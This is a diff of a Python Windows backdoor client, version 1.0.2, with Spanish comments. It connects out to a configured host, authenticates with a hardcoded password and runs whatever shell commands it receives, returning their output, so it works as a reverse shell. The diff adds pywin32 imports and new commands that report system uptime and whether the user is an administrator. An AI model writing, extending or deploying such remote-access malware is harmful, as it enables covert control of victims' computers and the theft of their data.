@@ -1,14 +1,62 @@
 # Testet in: Python 3.8.8
 # By: LawlietJH
-# Backdoor v1.0.1
+# Backdoor v1.0.2
 
 import subprocess
-import requests
+import requests						# python -m pip install requests
 import socket
 import base64
-import mss
+import mss							# python -m pip install mss
 import sys
 import os
+
+# Manipulacion de DLLs de Windows ======================================
+from ctypes import windll
+#=======================================================================
+
+# pip install pywin32 ==================================================
+from win32com.shell import shell
+import win32api			as WA
+import win32con			as WC
+import win32gui			as WG
+import win32ui			as WU
+import win32net			as WN
+import win32com			as WCM
+import win32process		as WP
+import win32security	as WS
+import win32clipboard	as WCB
+import win32console		as WCS
+#=======================================================================
+
+TITULO      = 'Backdoor'			# Nombre
+__version__ = 'v1.0.2'				# Version
+__author__  = 'LawlietJH'			# Desarrollador
+
+#=======================================================================
+#=======================================================================
+#=======================================================================
+
+class Helps:
+	
+	def systemUptime(raw=False):		# Tiempo de actividad del sistema
+		
+		mili = WA.GetTickCount()
+		
+		secs = (mili // 1000)
+		if raw: return str(secs)+'s'
+		mins = (secs // 60)
+		hrs  = (mins // 60)
+		days = (hrs  // 24)
+		
+		time = ''
+		if days > 0: time += str(days)+'d '
+		time += str(hrs %24).zfill(2)+':'
+		time += str(mins%60).zfill(2)+':'
+		time += str(secs%60).zfill(2)
+		
+		return time
+	
+	def isUserAnAdmin(): return shell.IsUserAnAdmin()
 
 
 
@@ -21,7 +69,7 @@ class Client():
 		self.CON_HOST  = CON_HOST
 		self.CON_PORT  = CON_PORT
 		self.CON = (self.CON_HOST, self.CON_PORT)
-		self.passwd = 'Z10N'
+		self.passwd = 'Z10N2'
 	
 	def get_chunks(self, data, bfc=2**16):	# 2^16 = 65536 bytes = 64 kb, bfc = bytes for chunk
 		
@@ -56,13 +104,15 @@ class Client():
 		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.client.connect(self.CON)
 		
+		self.client.send(self.passwd.encode())
+		if not self.client.recv(1024).decode() == 'ok':
+			print('\n Conexión rechazada.\n')
+			return
+		
 		self.current_dir = os.getcwd()
 		self.client.send(self.current_dir.encode())
 		
 		while True:
-			
-			# ~ alive = self.client.recv(1024).decode()
-			# ~ self.client.send(alive.encode())
 			
 			res = self.client.recv(1024).decode()
 			
@@ -143,6 +193,21 @@ class Client():
 				os.system('cls')
 				print('\n'+self.default_path+'>')
 				self.client.send('ok'.encode())
+			elif res.lower().startswith('activetime'):
+				if len(res) > 10:
+					if res[10:].strip() == 'raw':
+						res = Helps.systemUptime(True)
+					else:
+						self.client.send('Error'.encode())
+				else:
+					res = Helps.systemUptime()
+				self.client.send(res.encode())
+			elif res.lower() == 'isadmin':
+				if len(res) == 7 and Helps.isUserAnAdmin():
+					res = 'ok'
+				else:
+					self.client.send('Error'.encode())
+				self.client.send(res.encode())
 			else:
 				proc = self.run_command(res)
 				proc = proc.stdout.read() + proc.stderr.read()
